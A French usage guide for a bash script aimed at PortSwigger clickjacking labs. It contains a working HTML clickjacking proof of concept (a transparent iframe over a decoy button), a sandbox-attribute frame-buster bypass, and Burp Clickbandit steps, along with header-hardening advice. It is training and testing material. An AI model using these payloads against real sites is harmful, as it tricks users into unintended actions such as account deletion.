# MANPAGE

Voici un exemple exhaustif d’utilisation du script bash pour les challenges de clickjacking PortSwigger, couvrant chaque fonction et les résultats attendus :

---

## 1. Test de présence des headers anti-clickjacking

**But** : Vérifier si la page cible définit les headers `X-Frame-Options` et `Content-Security-Policy`.

**Exécution** :
```bash
./script.sh
```
**Sortie attendue** :
```
[1] Test de présence des headers anti-clickjacking
HTTP/1.1 200 OK
Content-Type: text/html; charset=UTF-8
...
>> [ALERTE] Header X-Frame-Options absent !
>> PROPOSITION : Ajouter X-Frame-Options: DENY ou SAMEORIGIN côté serveur.
>> [ALERTE] Header Content-Security-Policy absent !
>> PROPOSITION : Ajouter une directive CSP frame-ancestors pour restreindre l'embarquement en iframe.
```
**Analyse** : Si les headers sont absents, la page est potentiellement vulnérable au clickjacking[1][5].

---

## 2. Génération d’une preuve de concept HTML pour clickjacking

**But** : Générer une page HTML qui charge la cible dans une iframe transparente pour vérifier l’exploitabilité.

**Exécution** :
Le script affiche un code HTML :
```html
<!DOCTYPE html>
<html>
<head>
  <title>Clickjacking PoC</title>
  <style>
    #target-iframe {
      position: absolute;
      top: 0;
      left: 0;
      width: 800px;
      height: 600px;
      opacity: 0.1;
      z-index: 2;
      border: none;
    }
    #bait {
      position: absolute;
      top: 50px;
      left: 50px;
      z-index: 3;
      background: #fff;
      padding: 20px;
      font-size: 24px;
      border: 2px solid #000;
    }
  </style>
</head>
<body>
  <div id="bait">Cliquez ici pour gagner !</div>
  <iframe id="target-iframe" src="https://<your-lab>.web-security-academy.net/my-account"></iframe>
</body>
</html>
```
**Test** :  
- Hébergez ce fichier sur un exploit server ou ouvrez-le en local.
- Si la page cible s’affiche dans l’iframe, la protection anti-clickjacking est absente ou contournable[1][3][4].

---

## 3. Test de contournement avec sandbox (bypass de frame buster)

**But** : Tester si l’attribut `sandbox` permet de contourner un éventuel script frame buster.

**Exécution** :
Le script affiche un code HTML similaire, mais avec :
```html
<iframe id="target-iframe" sandbox="allow-forms allow-scripts" src="https://<your-lab>.web-security-academy.net/my-account"></iframe>
```
**Test** :  
- Utilisez ce PoC si la page cible utilise un script frame buster (voir labs PortSwigger sur ce sujet[7]).
- Si la page reste visible dans l’iframe, le contournement fonctionne.

---

## 4. Exploitation avancée avec Burp Clickbandit

**But** : Automatiser la création d’une attaque clickjacking complexe.

**Exécution** :
- Suivez les instructions affichées par le script :  
  - Lancez Burp Suite > Burp Clickbandit.
  - Copiez le script Clickbandit dans le presse-papier.
  - Collez-le dans la console développeur de votre navigateur sur la page cible.
  - Enregistrez et rejouez le scénario de clickjacking (ex : suppression de compte, modification d’email)[5][6].

**Résultat attendu** :  
- Burp Clickbandit génère une PoC HTML alignée sur le bouton cible, facilitant la validation de la vulnérabilité.

---

## Synthèse finale

**Sortie** :
```
------------------------------------------------------
[SYNTHÈSE]
1. Vérifiez la présence des headers X-Frame-Options et Content-Security-Policy.
2. Testez l'affichage de la page cible dans un iframe avec la PoC générée.
3. Essayez le bypass sandbox si un framebuster JS est présent.
4. Utilisez Burp Clickbandit pour des scénarios avancés.
Documentation PortSwigger : https://portswigger.net/web-security/clickjacking
------------------------------------------------------
```

---

